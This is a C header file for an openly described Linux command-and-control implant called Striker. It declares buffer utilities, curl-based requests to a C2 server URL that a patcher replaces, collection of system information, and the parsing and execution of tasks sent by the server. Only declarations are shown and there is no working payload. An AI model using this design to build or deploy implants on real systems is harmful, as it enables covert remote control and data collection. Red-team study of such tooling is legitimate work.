/**
 * Header file for the Striker C2 implant for linux.
 *             Author: Umar Abdul
 */

#ifndef STRIKER_H
#define STRIKER_H

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <curl/curl.h>
#include "cJSON.h"

// Set to non-zero value for debug outputs.
#define STRIKER_DEBUG 1
// The default URL. This is what the patcher will look for.
#define URL_SIZE (sizeof(char) * 512)
char baseURL[URL_SIZE] = "http://localhost:3000";
// Max task result size in bytes
#define MAX_RES_SIZE (sizeof(char) * 102400)

/**
 * A struct for working with buffers.
 * `buffer` is the buffer (very helpful :)
 * `size` is total number of bytes allocated to it.
 * `used` is used to track number of bytes in use.
 */
typedef struct{
  void *buffer;
  size_t size;
  size_t used;
} buffer;

/**
 * A struct for representing a single task.
 */
typedef struct{
  char *uid;
  char *type;
  cJSON *data;
  unsigned short completed;
  cJSON *result;
} task;

/**
 * A struct for tracking session info.
 */
typedef struct{
  char *uid;
  unsigned long delay;
} session;

/**
 * Create a new buffer of `size` bytes, and initialize all it's bytes to null.
 * If `size` is zero, the call to malloc() will use 1 to still allocate some memory but buffer.size
 * and buffer.used will be kept at 0.
 */
buffer *create_buffer(size_t size);

// Resize a buffer. It DOES NOT change the `used` property unless the `new_size` is less than it.
void resize_buffer(buffer *buff, size_t new_size);

/**
 * Append a max of `len` bytes from `src` to `dest` buffer.
 * Note: resize_buffer() will be used to resize the dest buffer if not enough space is available.
 * Returns the number of bytes appended.
 */
size_t append_buffer(buffer *dest, const void *src, size_t len);

// Empty `dest` buffer and copy the contents of null-terminated `src` as it's new value.
// It DOES NOT null-terminate the `dest` buffer.
size_t buffer_strcpy(buffer *dest, const char *src);

// Convert a buffer to a null-terminated string. Uses the `used` var to determine length.
char *buffer_to_string(buffer *buff);

// Free a buffer. Called when a buffer is no longer needed.
void free_buffer(buffer *buff);

/**
 * Initializes a new CURL object for a request to `path` relative to the base URL of the C2 server.
 * It does not define any headers.
 * Defines `buff` as the buffer to use for writing reponse body by the body_receiver() function.
 */
CURL *init_curl(const char *path, buffer *buff);

/**
 * Callback function for curl to receive response body inside a buffer.
 * This may be called multiple times with chunks of data, depending on the size of the body.
 */
size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff);

// Return a json object containing system information.
cJSON *sysinfo();

// Parse a task JSON and return it, NULL on error.
task *parse_task(cJSON *json);

// Execute a task.
void execute_task(session *striker, task *t);

// Starts the implant.
void start_session();

#endif // STRIKER_H
